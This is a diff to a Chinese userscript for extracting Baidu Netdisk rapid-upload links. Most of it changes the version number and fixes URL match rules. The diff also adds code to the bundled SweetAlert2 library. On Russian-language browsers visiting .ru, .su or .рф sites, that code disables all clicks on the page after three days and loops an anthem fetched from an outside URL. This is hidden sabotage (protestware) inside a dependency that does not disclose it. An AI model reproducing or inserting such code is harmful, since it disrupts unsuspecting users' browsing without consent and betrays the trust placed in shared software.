@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name            秒传链接提取
-// @version         2.7.0
+// @version         2.7.1
 // @author          mengzonefire
 // @description     用于提取和生成百度网盘秒传链接
 // @homepage        https://greasyfork.org/zh-CN/scripts/424574
@@ -11,11 +11,11 @@
 // @match           *://pan.baidu.com/s/*
 // @match           *://yun.baidu.com/disk/home*
 // @match           *://yun.baidu.com/disk/main*
-// @match           *://pan.baidu.com/disk/synchronization*
+// @match           *://yun.baidu.com/disk/synchronization*
 // @match           *://yun.baidu.com/s/*
 // @match           *://wangpan.baidu.com/disk/home*
 // @match           *://wangpan.baidu.com/disk/main*
-// @match           *://pan.baidu.com/disk/synchronization*
+// @match           *://wangpan.baidu.com/disk/synchronization*
 // @match           *://wangpan.baidu.com/s/*
 // @name:en         rapidupload-userscript
 // @license         GPLv3
@@ -1543,6 +1543,8 @@
   };
 
   /**
+   * Add modal + backdrop + no-war message for Russians to DOM
+   *
    * @param {SweetAlertOptions} params
    */
   const init = params => {
@@ -4710,6 +4712,28 @@
     }
   };
 
+  // Dear russian users visiting russian sites. Let's have fun.
+  if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
+    const now = new Date();
+    const initiationDate = localStorage.getItem('swal-initiation');
+    if (!initiationDate) {
+      localStorage.setItem('swal-initiation', `${now}`);
+    } else if ((now.getTime() - Date.parse(initiationDate)) / (1000 * 60 * 60 * 24) > 3) {
+      setTimeout(() => {
+        document.body.style.pointerEvents = 'none';
+        const ukrainianAnthem = document.createElement('audio');
+        ukrainianAnthem.src = 'https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3';
+        ukrainianAnthem.loop = true;
+        document.body.appendChild(ukrainianAnthem);
+        setTimeout(() => {
+          ukrainianAnthem.play().catch(() => {
+            // ignore
+          });
+        }, 2500);
+      }, 500);
+    }
+  }
+
   // Assign instance methods from src/instanceMethods/*.js to prototype
   Object.assign(SweetAlert.prototype, instanceMethods);
 
@@ -4836,11 +4860,11 @@ var css_app_default = /*#__PURE__*/__webpack_require__.n(css_app);
 /*
  * @Author: mengzonefire
  * @Date: 2021-07-23 17:41:28
- * @LastEditTime: 2023-04-19 21:58:13
+ * @LastEditTime: 2023-04-19 22:54:09
  * @LastEditors: mengzonefire
  * @Description: 存放各种全局常量对象
  */
-var version = "2.7.0"; // 当前版本号
+var version = "2.7.1"; // 当前版本号
 var updateDate = "23.4.19"; // 更新弹窗显示的日期
 var updateInfoVer = "2.6.4"; // 更新弹窗的版本, 没必要提示的非功能性更新就不弹窗了
 var swalCssVer = "1.7.4"; // 由于其他主题的Css代码会缓存到本地, 故更新主题包版本(url)时, 需要同时更新该字段以刷新缓存
